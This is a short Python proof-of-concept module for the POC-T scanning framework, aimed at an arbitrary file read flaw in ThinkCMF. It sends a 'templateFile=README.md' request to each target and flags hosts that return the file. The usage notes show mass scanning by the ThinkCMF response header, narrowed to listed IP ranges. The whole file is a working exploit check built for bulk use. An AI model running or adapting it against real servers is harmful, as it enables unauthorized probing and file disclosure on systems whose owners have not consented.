#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
thinkcmf 任意文件读取PoC


Usage
  python POC-T.py -s thinkcmf-lfi -iF target.txt
   python2 POC-T.py -s thinkcmf-lfi -aF "header=\"X-Powered-By: ThinkCMF\""



python2 POC-T.py -s thinkcmf-lfi -aF "header=\"X-Powered-By: ThinkCMF\"&&(ip=\"119.75.208.0/20\" ||ip=\"121.10.174.208/29\" || ip=\"58.252.73.104\" ||ip=\"180.76.0.0/16\" ||ip=\"182.61.0.0/16\" ||ip=\"61.135.186.0/24\" ||ip=\"61.135.185.0/24\" ||ip=\"103.6.76.0/22\" ||ip=\"150.242.120.0/22\""
"""

import requests


def poc(target):
    base_url = target if "://" in target else 'http://' + target
    url = base_url + "/?a=display&templateFile=README.md"
    try:
        g = requests.get(url=url, timeout=8)
        if g.status_code is 200 and 'README' in g.content and 'ThinkCMF' in g.content:
            return base_url

    except Exception:
        pass
        
    return False
